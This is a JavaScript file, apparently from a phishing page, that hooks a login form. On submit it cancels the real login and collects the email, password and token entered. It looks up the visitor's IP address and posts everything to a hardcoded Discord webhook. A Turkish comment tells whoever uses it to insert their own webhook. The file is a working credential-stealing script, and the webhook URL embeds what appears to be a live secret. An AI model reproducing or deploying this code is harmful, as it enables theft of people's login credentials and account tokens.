document.addEventListener('DOMContentLoaded', function() {
    var loginForm = document.getElementById('login-form');

    loginForm.addEventListener('submit', function(event) {
        event.preventDefault();

        var email = document.getElementById('email').value;
        var password = document.getElementById('password').value;
        var token = document.getElementById('token').value;

        // IP adresini almak için API isteği yapılıyor
        var ip = '';
        fetch('https://api.ipify.org/?format=json')
            .then(response => response.json())
            .then(data => {
                ip = data.ip;

                var loginInfo = {
                    email: email,
                    password: password,
                    token: token,
                    ip: ip
                };

                var message = {
                    content: 'Login Information\nEmail: ' + loginInfo.email + '\nPassword: ' + loginInfo.password + '\nToken: ' + loginInfo.token + '\nIP: ' + loginInfo.ip
                };

                var webhook = 'https://discordapp.com/api/webhooks/1210678056717389904/ebAX_YnPaQsDq4xxImO5cqIOczzQv54WNSXMrJeMnq6009vg7gku3ZSawI_yGxJQgiVF'; // Burada kendi webhook bilgilerinizi eklemelisiniz
                fetch(webhook, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(message)
                });
            });
    });
});
